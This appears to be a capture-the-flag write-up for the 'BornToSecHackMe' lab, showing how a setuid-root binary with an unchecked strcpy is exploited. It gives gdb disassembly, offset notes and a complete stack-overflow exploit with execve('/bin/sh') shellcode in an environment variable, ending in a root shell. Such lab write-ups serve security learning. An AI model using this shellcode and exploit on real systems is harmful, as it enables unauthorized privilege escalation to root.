@@ -1,0 +1,150 @@
+zaz@BornToSecHackMe:~$ ls -lRa
+.:
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 9 www-data root  126 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+
+./.cache:
+total 0
+drwx------ 2 zaz zaz  43 Oct 14  2015 .
+drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
+-rw-r--r-- 1 zaz zaz   0 Oct 14  2015 motd.legal-displayed
+
+./mail:
+total 1
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 .
+drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .imap
+-rwxr-x--- 1 zaz zaz  36 Oct  8  2015 .subscriptions
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Drafts
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Sent
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Trash
+
+./mail/.imap:
+total 1
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 ..
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Drafts
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Sent
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Trash
+-rwxr-x--- 1 zaz zaz  72 Oct  8  2015 dovecot.mailbox.log
+
+./mail/.imap/INBOX.Drafts:
+total 1
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 .
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 ..
+-rwxr-x--- 1 zaz zaz 148 Oct  8  2015 dovecot.index.log
+
+./mail/.imap/INBOX.Sent:
+total 1
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 .
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 ..
+-rwxr-x--- 1 zaz zaz 148 Oct  8  2015 dovecot.index.log
+
+./mail/.imap/INBOX.Trash:
+total 1
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 .
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 ..
+-rwxr-x--- 1 zaz zaz 148 Oct  8  2015 dovecot.index.log
+
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+0x080482b4  _init
+0x08048300  strcpy
+0x08048300  strcpy@plt
+0x08048310  puts
+0x08048310  puts@plt
+0x08048320  __gmon_start__
+0x08048320  __gmon_start__@plt
+0x08048330  __libc_start_main
+0x08048330  __libc_start_main@plt
+0x08048340  _start
+0x08048370  __do_global_dtors_aux
+0x080483d0  frame_dummy
+0x080483f4  main
+0x08048440  __libc_csu_init
+0x080484b0  __libc_csu_fini
+0x080484b2  __i686.get_pc_thunk.bx
+0x080484c0  __do_global_ctors_aux
+0x080484ec  _fini
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea   ß 0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+
+********************************************************************
+So we can rewrite the eip with strcpy and jump on our shellcode.
+We put our shellcode in an environment variable "SHELLCODE". 
+We get her address.
+********************************************************************
+
+env -i SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` gdb exploit_me
+
+(gdb) b *main
+Breakpoint 1 at 0x80483f4
+(gdb) run
+Starting program: /home/zaz/exploit_me 
+
+Breakpoint 1, 0x080483f4 in main ()
+(gdb) x /200s environ
+...
+0xbffffb8b:      "/home/zaz/exploit_me"
+0xbffffba0:      "COLUMNS=203"
+0xbffffbac:      "PWD=/home/zaz"
+0xbffffbba:      "LINES=24"
+0xbffffbc3:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+0xbffffc8b:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+0xbffffd53:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+...
+(gdb) x $esp
+0xbffffa0c:     0xb7e454d3
+
+********************************************************************
+We will jump on 0xbffffd53.
+To find the address of eip, we calcul the offset.
+0x90 = 144.
+144 - 16 + 12 = 128
+********************************************************************
+
+zaz@BornToSecHackMe:~$ var=`python -c "print('A' * 140 + '\x53\xfd\xff\xbf')"` ; env -i SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` ./exploit_me $var
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
+# ls -l
+total 9
+-rwxrwxrwx 1 zaz  zaz  133 Feb 19 20:58 exploit
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+# pwd
+/home/zaz
+# whoami
+root
